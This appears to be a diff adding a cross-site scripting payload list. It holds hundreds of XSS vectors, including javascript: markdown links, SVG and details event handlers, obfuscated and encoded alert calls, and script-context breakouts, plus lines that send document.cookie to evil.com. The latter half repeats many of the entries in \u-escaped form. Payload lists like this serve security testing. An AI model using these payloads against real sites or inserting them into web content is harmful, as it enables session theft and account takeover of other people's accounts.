+<svg onload="var x=window; x['ale'+'rt']('ticofook');"></svg>
+<svg onload="setTimeout(function(){eval(atob('ZG9jdW1lbnQud3JpdGUoJzxpbWcgc3JjPVx1MDBiM3hvbj0nYWxlcnQoJ1Z1bG5lcmFiaWxpZGFkZSBkZXRlY3RhZGEnKSc+Jyk7'))}, 1000)"></svg>
+<details/open/id="&quot;"ontoggle=[JS]>
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&search=<svg/ onload=alert(1)>
+[a](javascript:prompt(document.domain))
+[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
+![a](javascript:prompt(document.cookie))\
+<javascript:prompt(document.cookie)>
+<&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
+[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+[a](&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29)
+![a'"`onerror=prompt(document.cookie)](x)\
+[citelol]: (javascript:prompt(document.cookie))
+[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
+[test](javascript://%0d%0aprompt(1))
+[test](javascript://%0d%0aprompt(1);com)
+[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
+[notmalicious](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)
+[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+[clickme](vbscript:alert(document.domain))
+_http://danlec_@.1 style=background-image:url(data:image/png;base64,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);background-repeat:no-repeat;display:block;width:100%;height:100px; onclick=alert(unescape(/Oh%20No!/.source));return(false);//
+<http://\<meta\ http-equiv=\"refresh\"\ content=\"0;\ url=http://danlec.com/\"\>>
+[text](http://danlec.com " [@danlec](/danlec) ")
+[a](javascript:this;alert(1))
+[a](javascript:this;alert(1&#41;)
+[a](javascript&#58this;alert(1&#41;)
+[a](Javas&#99;ript:alert(1&#41;)
+[a](Javas%26%2399;ript:alert(1&#41;)
+[a](javascript:alert&#65534;(1&#41;)
+[a](javascript:confirm(1)
+[a](javascript://www.google.com%0Aprompt(1))
+[a](javascript://%0d%0aconfirm(1);com)
+[a](javascript:window.onerror=confirm;throw%201)
+[a](�javascript:alert(document.domain&#41;)
+[a](javascript://www.google.com%0Aalert(1))
+[a]('javascript:alert("1")')
+[a](JaVaScRiPt:alert(1))
+![a](https://www.google.com/image.png"onload="alert(1))
+![a]("onerror="alert(1))
+</http://<?php\><\h1\><script:script>confirm(2)
+[steven](.alert(1);)
+[ ](https://evil.com?p=[[/data-x=. style=background-color:#000000;z-index:999;width:100%;position:fixed;top:0;left:0;right:0;bottom:0; data-y=.]])
+[ ](http://a?p=[[/onclick=alert(0) .]])
+[a](javascript:new%20Function`al\ert\`1\``;)
+<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
+<svg><p><style><a id="</style><img src=1 onerror=alert(1)>"></p></svg>
+console.trace()
+console.error()
+console.trace``
+console.error``
+confirm?.(1)
+top.confirm?.(1)
+alert?.(1)
+(a=>a(1))(alert);
+setTimeout(alert, 0, 1)
+[1].forEach(alert);
+alert.bind()(1)
+a=alert;a`1`;
+alert()
+alert/**/()
+alert (10)
+alert\n(1)
+var{a:onerror}={a:alert};throw%20document.cookie
+alert(1)
+window['alert'](0)
+parent['alert'](1)
+self['alert'](2)
+top['alert'](3)
+this['alert'](4)
+frames['alert'](5)
+content['alert'](6)
+[7].map(alert)
+[8].find(alert)
+[9].every(alert)
+[10].filter(alert)
+[11].findIndex(alert)
+[12].forEach(alert);
+eval('ale'+'rt(0)');
+eval('ale'+'rt(0)');
+Function("ale"+"rt(1)")();
+new Function`al\ert\`6\``;
+constructor.constructor("aler"+"t(3)")();
+[].filter.constructor('ale'+'rt(4)')();
+top["al"+"ert"](5);
+top[8680439..toString(30)](7);
+top[/al/.source+/ert/.source](8);
+top['al\x65rt'](9);
+open('java'+'script:ale'+'rt(11)');
+setTimeout`alert\u0028document.domain\u0029`;
+setTimeout('ale'+'rt(2)');
+setInterval('ale'+'rt(10)');
+Set.constructor('ale'+'rt(13)')();
+Set.constructor`al\x65rt\x2814\x29```;
+[666]["\155\141\160"]["\143\157\156\163\164\162\165\143\164\157\162"]("\141\154\145\162\164(666)")(666)
+<script>
+  var test = "\", test1="+alert(45)//input2"
+  // Original: var test = "input1", test1="input2"
+  // user input1: \
+  // user input2: +alert(45)//
+</script>
+<script>
+  var test = ""+alert(45)+""
+  // user input: "+alert(45)+"
+</script>
+<script>
+  var test = "</script ><svg/onload=alert(45)>"
+</script>
+<script>
+  var test = "</script  ><svg/onload=alert(45)>"
+</script>
+<script>
+  var test = "</script random><svg/onload=alert(45)>"
+</script>
+<script>
+  var test = "</script
+random><svg/onload=alert(45)>"
+</script>
+<script>
+  var test = "</script
+random><svg/onload=alert(45)>"
+</script>
+<script>
+  var test = "</script <img><svg/onload=alert(45)>"
+</script>
+'-alert(1)-'
+"-alert(1)-"
+);alert(1)//
+';alert(1)//
+";alert(1)//
+"><img/src/onerror=alert(1)>//
+'><img/src/onerror=alert(1)>//
+>"@input="this.alert`1`
+>'@input='this.alert`1`
+&quot onerror='alert(1)'
+" onerror='alert(1)'
+<svg/onload='alert&#40 23 &#41'>
+location=/javascript:alert%2823%29/.source;
+<img/src/onerror=alert(1)>
+<svg/onload=alert(1)>
+<object/data=javascript:prompt(1)>
+<input/autofocus/onfocus=prompt(1)>
+<audio/src/onloadstart=alert(1)>
+<svg><animate/onbegin=alert(1)>
+<svg><animate/dur='1s'onend=alert(1)>
+<svg><set/onbegin=alert(1)>
+<svg><set/dur='1ms'onend=alert(1)>
+<marquee width=1 loop=1 onfinish=alert(1)>
+<details/open/ontoggle=confirm(1)>
+<details open ontoggle=confirm(1)>
+<details/ontoggle='alert(1)'/open>
+<details ontoggle=alert(1) open>
+<script src=//0x8ac5c30a>
+<iframe src="javascript:alert('steven')"> #use href bypass
+<iframe src="https://youtube.com.evil.domain/ "> # if youtube is whitelisted for example
+<iframe src="https://google.com@evil.domain">
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="> # base64 <script>alert(1)</script>
+test+(<script>alert(0)</script>)@example.com
+test@example(<script>alert(0)</script>).com
+"<script>alert(0)</script>"@example.com
+( -> &#x28; = &#x0000028;
+( -> &#40; = &#0000000000040;
+<!--javascript -->
+javascript:alert(1)
+JaVaScript:alert(1)
+ja&Tab;vascript:alert(1)
+java\tscript:alert(1)
+ja&NewLine;vascript:alert(1)
+ja&#x0000A;vascript:alert(1)
+java&#x73;cript:alert()
+&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('steven')
+javascript:alert(1)
+jav     asc     ript    :alert(1)
+javascript&colon;alert()
+javascript&#x0003A;alert()
+javascript&#58;alert(1)
+javascript&#x3A;alert()
+javascript://%0Aalert(1)
+javascript://%0Dalert(1)
+javascript:alert&lpar;&rpar;
+javascript:al&#x65;rt``
+javascript:alert%60%60
+javascript:x='%27-alert(1)-%27';
+javascript:%61%6c%65%72%74%28%29
+javascript:a\u006Cert``"
+javascript:\u0061\u006C\u0065\u0072\u0074``
+fetch("//evil.com/?c="+document.cookie)
+fetch("//evil.com/?c=".concat(document.cookie))
+fetch("//evil.com/?c=", document.cookie].join())
+fetch(`//evil.com/?c=${document.cookie}`)
+document.cookie
+document['cookie']
+with(document)alert(cookie)
+doc\u0075ment.cookie
+doc\u0075ment['cookie']
+window["doc"+"ument"]["cookie"]
+//google.com/?=a
+//134744072:1234/?a=window["doc"+"ument"]["cookie"]
+document.location=
+document['location']=
+window.location=
+this["window"]["location"]=
+document.location.href=
+location.href=
+location=
+window.location.assign()
+window['location']['href']=
+document.location.replace()
+window.open("link", "_blank");
+[+]String em Unicode[+]
+\u003cdetails\u002fopen\u002fid\u003d\u0022\u0026quot\u003b\u0022ontoggle\u003d\u005bJS\u005d\u003e
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u0026search\u003d\u003csvg\u002f onload\u003dalert\u00281\u0029\u003e
+\u005ba\u005d\u0028javascript\u003aprompt\u0028document\u002ecookie\u0029\u0029
+\u005ba\u005d\u0028j    a   v   a   s   c   r   i   p   t\u003aprompt\u0028document\u002ecookie\u0029\u0029
+\u0021\u005ba\u005d\u0028javascript\u003aprompt\u0028document\u002ecookie\u0029\u0029\u005c
+\u003cjavascript\u003aprompt\u0028document\u002ecookie\u0029\u003e
+\u003c\u0026\u0023x6A\u0026\u0023x61\u0026\u0023x76\u0026\u0023x61\u0026\u0023x73\u0026\u0023x63\u0026\u0023x72\u0026\u0023x69\u0026\u0023x70\u0026\u0023x74\u0026\u0023x3A\u0026\u0023x61\u0026\u0023x6C\u0026\u0023x65\u0026\u0023x72\u0026\u0023x74\u0026\u0023x28\u0026\u0023x27\u0026\u0023x58\u0026\u0023x53\u0026\u0023x53\u0026\u0023x27\u0026\u0023x29\u003e
+\u0021\u005ba\u005d\u0028data\u003atext\u002fhtml\u003bbase64\u002cPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\u0029\u005c
+\u005ba\u005d\u0028data\u003atext\u002fhtml\u003bbase64\u002cPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\u0029
+\u005ba\u005d\u0028\u0026\u0023x6A\u0026\u0023x61\u0026\u0023x76\u0026\u0023x61\u0026\u0023x73\u0026\u0023x63\u0026\u0023x72\u0026\u0023x69\u0026\u0023x70\u0026\u0023x74\u0026\u0023x3A\u0026\u0023x61\u0026\u0023x6C\u0026\u0023x65\u0026\u0023x72\u0026\u0023x74\u0026\u0023x28\u0026\u0023x27\u0026\u0023x58\u0026\u0023x53\u0026\u0023x53\u0026\u0023x27\u0026\u0023x29\u0029
+\u0021\u005ba\u0027\u0022\u0060onerror\u003dprompt\u0028document\u002ecookie\u0029\u005d\u0028x\u0029\u005c
+\u005bcitelol\u005d\u003a \u0028javascript\u003aprompt\u0028document\u002ecookie\u0029\u0029
+\u005bnotmalicious\u005d\u0028javascript\u003awindow\u002eonerror\u003dalert\u003bthrow\u002520document\u002ecookie\u0029
+\u005btest\u005d\u0028javascript\u003a\u002f\u002f\u00250d\u00250aprompt\u00281\u0029\u0029
+\u005btest\u005d\u0028javascript\u003a\u002f\u002f\u00250d\u00250aprompt\u00281\u0029\u003bcom\u0029
+\u005bnotmalicious\u005d\u0028javascript\u003awindow\u002eonerror\u003dalert\u003bthrow\u002520document\u002ecookie\u0029
+\u005bnotmalicious\u005d\u0028javascript\u003a\u002f\u002f\u00250d\u00250awindow\u002eonerror\u003dalert\u003bthrow\u002520document\u002ecookie\u0029
+\u005ba\u005d\u0028data\u003atext\u002fhtml\u003bbase64\u002cPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\u0029
+\u005bclickme\u005d\u0028vbscript\u003aalert\u0028document\u002edomain\u0029\u0029
+\u005fhttp\u003a\u002f\u002fdanlec\u005f\u0040\u002e1 style\u003dbackground\u002dimage\u003aurl\u0028data\u003aimage\u002fpng\u003bbase64\u002ciVBORw0KGgoAAAANSUhEUgAAAIAAAABACAMAAADlCI9NAAACcFBMVEX\u002fAAD\u002f\u002f\u002f\u002f\u002f\u002ff3\u002f\u002fv7\u002f0tL\u002fAQH\u002fcHD\u002fCwv\u002f\u002b\u002fv\u002fCQn\u002fEBD\u002fFRX\u002f\u002bPj\u002fISH\u002fPDz\u002f6Oj\u002fCAj\u002fFBT\u002fDAz\u002fBgb\u002frq7\u002fp6f\u002fgID\u002fmpr\u002foaH\u002fNTX\u002f5\u002bf\u002fmZn\u002fwcH\u002fICD\u002fERH\u002fSkr\u002f3Nz\u002fAgL\u002ftrb\u002fQED\u002fz8\u002f\u002f6\u002bv\u002fBAT\u002fi4v\u002f9fX\u002fZWX\u002fx8f\u002faGj\u002fysr\u002f8\u002fP\u002fUlL\u002f8vL\u002fT0\u002f\u002fdXX\u002fhIT\u002feXn\u002fbGz\u002fiIj\u002fXV3\u002fjo7\u002fW1v\u002fwMD\u002fHh7\u002f\u002bvr\u002ft7f\u002f1dX\u002fHBz\u002fzc3\u002fnJz\u002f4eH\u002fZmb\u002fHx\u002f\u002fRET\u002fNjb\u002fjIz\u002ff3\u002f\u002fOjr\u002fw8P\u002fGhr\u002f8PD\u002fJyf\u002fmJj\u002fAwP\u002fsrL\u002fCgr\u002f1NT\u002f5ub\u002fPT3\u002ffHz\u002fDw\u002f\u002feHj\u002fra3\u002fIiL\u002fDQ3\u002f\u002fPz\u002f9\u002ff\u002fLy\u002f\u002f\u002bfn\u002fUFD\u002fMTH\u002fvb3\u002f7Oz\u002fpKT\u002f1tb\u002f2tr\u002fjY3\u002f6en\u002fQkL\u002f5OT\u002fubn\u002fJSX\u002fMjL\u002fKyv\u002fFxf\u002fRkb\u002fsbH\u002f39\u002f\u002fiYn\u002fq6v\u002fqqr\u002fY2P\u002fLi7\u002fwsL\u002fuLj\u002f4\u002bP\u002fyMj\u002fS0v\u002fGRn\u002fcnL\u002fhob\u002fl5f\u002fs7P\u002fTk7\u002fWVn\u002fior\u002f09P\u002fhYX\u002fbW3\u002fGBj\u002fXFz\u002faWn\u002fQ0P\u002fvLz\u002fKCj\u002fkZH\u002f5eX\u002fU1P\u002fWlr\u002fcXH\u002f7\u002b\u002f\u002fKir\u002fr6\u002f\u002fLS3\u002fvr7\u002flpb\u002flZX\u002fWFj\u002fODj\u002fa2v\u002fTU3\u002furr\u002ftbX\u002fnp7\u002fBQX\u002fSUn\u002fBwf\u002f4uL\u002fd3f\u002fExP\u002fy8v\u002fNDT\u002fKSn\u002fgoL\u002f8fH\u002fqan\u002fpaX\u002f2Nj\u002fHR3\u002f4OD\u002fVFT\u002fZ2f\u002fSEj\u002fbm7\u002fv7\u002f\u002fRUX\u002fFhb\u002fycn\u002fV1f\u002fm5v\u002fIyP\u002fxMT\u002frKz\u002foKD\u002f7e3\u002fdHT\u002fh4f\u002fPj7\u002fb2\u002f\u002ffn7\u002foqL\u002f7u7\u002f2dn\u002fTEz\u002fGxv\u002f6ur\u002f3d3\u002fNzf\u002fk5P\u002fEhL\u002fDg7\u002fo6P\u002fUVHe\u002fLWIAAADf0lEQVR4Xu3UY7MraRRH8b26g2Pbtn1t27Zt37Ft27Zt6yvNpPqpPp3GneSeqZo3z3r5T1XXL6nOFnc6nU6n0\u002bl046tPruw\u002f\u002bVil\u002fC8tvfscquuuOGTPT2ZnRySwWaFQqGG8Y6j6Zzgggd0XChWLf\u002fU1OFoQaVJ7AayUwPYALHEM6UCWBDYJbhXfHjUBOHvVqz8YABxfnDCArrED7jSAs13Px4Zo1jmA7eGEAXvXjRVQuQE4USWqp5pNoCthALePFfAQ0OcchoCGBAEPgPGiE7AiacChDfBmjjg7DVztAKRtnJsXALj\u002fHpiy2B9wofqW9AQAg8Bd8VOpCR02YMVEE4xli\u002fL8AOmtQMQHsP9IGUBZedq\u002fAWJfIez\u002bx4KZqgDtBlbzon6A8GnonOwBXNONavlmUS2Dx8XTjcCwe1wNvGQB2gxaKhbV7Ubx3QC5bRMUuAEvA9kFzzW3TQAeVoB5cFw8zQUGPH9M4LwFgML5IpL6BHCvH0DmAD3xgIUpUJcTmy7UQHaV\u002fbteKZ6GgGr3eAq4QQEmWlNqJ1z0BeTvgGfz4gAFsDXfUmbeAeoAF0OfuLL8C91jHnCtBchYq7YzsMsXIFkmDDsBjwBfi2o6GM9IrOshIp5mA6vc42Sg1wJMEVUJlPgDpBzWb3EAVsMOm5m7Hg5KrAjcJJ5uRn3uLAvosgBrRPUgnAgApC2HjtpRwFTneZRpqLs6Ak\u002bLp5lAj9\u002bLccoCzLYPZjBA3gIGRgHj4EuxewH6JdZhKBVPM4CL7rEIiKo7kMAvILIEXplvA\u002fbCR2JXAYMSawtkiqfaDHjNtYVfhzJJBvBGJ3zmADhv6054W71ZrBNvHZDigr0DDCcFkHeB8wog70G\u002f2LXA\u002bxIrh03i02Zgavx0Blo\u002bSA5Q\u002byEcrVSAYvjYBhwEPrEoDZ\u002bKX20wIe7G1ZtwTJIDyMYU\u002bFwBeuGLpaLqg91NcqnqgQU9Yre\u002fETpzkwXIIKAAmRnQruboUeiVS1cHmF8pcv70bqBVkgak1tgAaYbuw9bj9kFjVN28wsJvxK9VFQDGzjVF7d9\u002b9z1ARJIHyMxRQNo2SDn2408HBsY5njZJPcFbTomJo59H5HIAUmIDpPQXVGS0igfg7detBqptv\u002f0ulwfIbbQB8kchVtNmiQsQUO7Qru37jpQX7WmS\u002f6YZPXP\u002bLPprbVgC0ul0Op1Op9Pp\u002fgYrAa7fWhG7QQAAAABJRU5ErkJggg\u003d\u003d\u0029\u003bbackground\u002drepeat\u003ano\u002drepeat\u003bdisplay\u003ablock\u003bwidth\u003a100\u0025\u003bheight\u003a100px\u003b onclick\u003dalert\u0028unescape\u0028\u002fOh\u002520No\u0021\u002f\u002esource\u0029\u0029\u003breturn\u0028false\u0029\u003b\u002f\u002f
+\u003chttp\u003a\u002f\u002f\u005c\u003cmeta\u005c http\u002dequiv\u003d\u005c\u0022refresh\u005c\u0022\u005c content\u003d\u005c\u00220\u003b\u005c url\u003dhttp\u003a\u002f\u002fdanlec\u002ecom\u002f\u005c\u0022\u005c\u003e\u003e
+\u005btext\u005d\u0028http\u003a\u002f\u002fdanlec\u002ecom \u0022 \u005b\u0040danlec\u005d\u0028\u002fdanlec\u0029 \u0022\u0029
+\u005ba\u005d\u0028javascript\u003athis\u003balert\u00281\u0029\u0029
+\u005ba\u005d\u0028javascript\u003athis\u003balert\u00281\u0026\u002341\u003b\u0029
+\u005ba\u005d\u0028javascript\u0026\u002358this\u003balert\u00281\u0026\u002341\u003b\u0029
+\u005ba\u005d\u0028Javas\u0026\u002399\u003bript\u003aalert\u00281\u0026\u002341\u003b\u0029
+\u005ba\u005d\u0028Javas\u002526\u00252399\u003bript\u003aalert\u00281\u0026\u002341\u003b\u0029
+\u005ba\u005d\u0028javascript\u003aalert\u0026\u002365534\u003b\u00281\u0026\u002341\u003b\u0029
+\u005ba\u005d\u0028javascript\u003aconfirm\u00281\u0029
+\u005ba\u005d\u0028javascript\u003a\u002f\u002fwww\u002egoogle\u002ecom\u00250Aprompt\u00281\u0029\u0029
+\u005ba\u005d\u0028javascript\u003a\u002f\u002f\u00250d\u00250aconfirm\u00281\u0029\u003bcom\u0029
+\u005ba\u005d\u0028javascript\u003awindow\u002eonerror\u003dconfirm\u003bthrow\u0025201\u0029
+\u005ba\u005d\u0028�javascript\u003aalert\u0028document\u002edomain\u0026\u002341\u003b\u0029
+\u005ba\u005d\u0028javascript\u003a\u002f\u002fwww\u002egoogle\u002ecom\u00250Aalert\u00281\u0029\u0029
+\u005ba\u005d\u0028\u0027javascript\u003aalert\u0028\u00221\u0022\u0029\u0027\u0029
+\u005ba\u005d\u0028JaVaScRiPt\u003aalert\u00281\u0029\u0029
+\u0021\u005ba\u005d\u0028https\u003a\u002f\u002fwww\u002egoogle\u002ecom\u002fimage\u002epng\u0022onload\u003d\u0022alert\u00281\u0029\u0029
+\u0021\u005ba\u005d\u0028\u0022onerror\u003d\u0022alert\u00281\u0029\u0029
+\u003c\u002fhttp\u003a\u002f\u002f\u003c\u003fphp\u005c\u003e\u003c\u005ch1\u005c\u003e\u003cscript\u003ascript\u003econfirm\u00282\u0029
+\u005bsteven\u005d\u0028\u002ealert\u00281\u0029\u003b\u0029
+\u005b \u005d\u0028https\u003a\u002f\u002fa\u002ede\u003fp\u003d\u005b\u005b\u002fdata\u002dx\u003d\u002e style\u003dbackground\u002dcolor\u003a\u0023000000\u003bz\u002dindex\u003a999\u003bwidth\u003a100\u0025\u003bposition\u003afixed\u003btop\u003a0\u003bleft\u003a0\u003bright\u003a0\u003bbottom\u003a0\u003b data\u002dy\u003d\u002e\u005d\u005d\u0029
+\u005b \u005d\u0028http\u003a\u002f\u002fa\u003fp\u003d\u005b\u005b\u002fonclick\u003dalert\u00280\u0029 \u002e\u005d\u005d\u0029
+\u005ba\u005d\u0028javascript\u003anew\u002520Function\u0060al\u005cert\u005c\u00601\u005c\u0060\u0060\u003b\u0029
+\u003csvg\u003e\u003c\u002fp\u003e\u003cstyle\u003e\u003ca id\u003d\u0022\u003c\u002fstyle\u003e\u003cimg src\u003d1 onerror\u003dalert\u00281\u0029\u003e\u0022\u003e
+\u003csvg\u003e\u003cp\u003e\u003cstyle\u003e\u003ca id\u003d\u0022\u003c\u002fstyle\u003e\u003cimg src\u003d1 onerror\u003dalert\u00281\u0029\u003e\u0022\u003e\u003c\u002fp\u003e\u003c\u002fsvg\u003e
+console\u002etrace\u0028\u0029
+console\u002eerror\u0028\u0029
+console\u002etrace\u0060\u0060
+console\u002eerror\u0060\u0060
+confirm\u003f\u002e\u00281\u0029
+top\u002econfirm\u003f\u002e\u00281\u0029
+alert\u003f\u002e\u00281\u0029
+\u0028a\u003d\u003ea\u00281\u0029\u0029\u0028alert\u0029\u003b
+setTimeout\u0028alert\u002c 0\u002c 1\u0029
+\u005b1\u005d\u002eforEach\u0028alert\u0029\u003b
+alert\u002ebind\u0028\u0029\u00281\u0029
+a\u003dalert\u003ba\u00601\u0060\u003b
+alert\u0028\u0029
+alert\u002f\u002a\u002a\u002f\u0028\u0029
+alert \u002810\u0029
+alert\u005cn\u00281\u0029
+var{a\u003aonerror}\u003d{a\u003aalert}\u003bthrow\u002520document\u002ecookie
+alert\u00281\u0029
+window\u005b\u0027alert\u0027\u005d\u00280\u0029
+parent\u005b\u0027alert\u0027\u005d\u00281\u0029
+self\u005b\u0027alert\u0027\u005d\u00282\u0029
+top\u005b\u0027alert\u0027\u005d\u00283\u0029
+this\u005b\u0027alert\u0027\u005d\u00284\u0029
+frames\u005b\u0027alert\u0027\u005d\u00285\u0029
+content\u005b\u0027alert\u0027\u005d\u00286\u0029
+\u005b7\u005d\u002emap\u0028alert\u0029
+\u005b8\u005d\u002efind\u0028alert\u0029
+\u005b9\u005d\u002eevery\u0028alert\u0029
+\u005b10\u005d\u002efilter\u0028alert\u0029
+\u005b11\u005d\u002efindIndex\u0028alert\u0029
+\u005b12\u005d\u002eforEach\u0028alert\u0029\u003b
+eval\u0028\u0027ale\u0027\u002b\u0027rt\u00280\u0029\u0027\u0029\u003b
+eval\u0028\u0027ale\u0027\u002b\u0027rt\u00280\u0029\u0027\u0029\u003b
+Function\u0028\u0022ale\u0022\u002b\u0022rt\u00281\u0029\u0022\u0029\u0028\u0029\u003b
+new Function\u0060al\u005cert\u005c\u00606\u005c\u0060\u0060\u003b
+constructor\u002econstructor\u0028\u0022aler\u0022\u002b\u0022t\u00283\u0029\u0022\u0029\u0028\u0029\u003b
+\u005b\u005d\u002efilter\u002econstructor\u0028\u0027ale\u0027\u002b\u0027rt\u00284\u0029\u0027\u0029\u0028\u0029\u003b
+top\u005b\u0022al\u0022\u002b\u0022ert\u0022\u005d\u00285\u0029\u003b
+top\u005b8680439\u002e\u002etoString\u002830\u0029\u005d\u00287\u0029\u003b
+top\u005b\u002fal\u002f\u002esource\u002b\u002fert\u002f\u002esource\u005d\u00288\u0029\u003b
+top\u005b\u0027al\u005cx65rt\u0027\u005d\u00289\u0029\u003b
+open\u0028\u0027java\u0027\u002b\u0027script\u003aale\u0027\u002b\u0027rt\u002811\u0029\u0027\u0029\u003b
+setTimeout\u0060alert\u005cu0028document\u002edomain\u005cu0029\u0060\u003b
+setTimeout\u0028\u0027ale\u0027\u002b\u0027rt\u00282\u0029\u0027\u0029\u003b
+setInterval\u0028\u0027ale\u0027\u002b\u0027rt\u002810\u0029\u0027\u0029\u003b
+Set\u002econstructor\u0028\u0027ale\u0027\u002b\u0027rt\u002813\u0029\u0027\u0029\u0028\u0029\u003b
+Set\u002econstructor\u0060al\u005cx65rt\u005cx2814\u005cx29\u0060\u0060\u0060\u003b
+\u005b666\u005d\u005b\u0022\u005c155\u005c141\u005c160\u0022\u005d\u005b\u0022\u005c143\u005c157\u005c156\u005c163\u005c164\u005c162\u005c165\u005c143\u005c164\u005c157\u005c162\u0022\u005d\u0028\u0022\u005c141\u005c154\u005c145\u005c162\u005c164\u0028666\u0029\u0022\u0029\u0028666\u0029
+\u003cscript\u003e
+  var test \u003d \u0022\u005c\u0022\u002c test1\u003d\u0022\u002balert\u002845\u0029\u002f\u002finput2\u0022
+  \u002f\u002f Original\u003a var test \u003d \u0022input1\u0022\u002c test1\u003d\u0022input2\u0022
+  \u002f\u002f user input1\u003a \u005c
+  \u002f\u002f user input2\u003a \u002balert\u002845\u0029\u002f\u002f
+\u003c\u002fscript\u003e
+\u003cscript\u003e
+  var test \u003d \u0022\u0022\u002balert\u002845\u0029\u002b\u0022\u0022
+  \u002f\u002f user input\u003a \u0022\u002balert\u002845\u0029\u002b\u0022
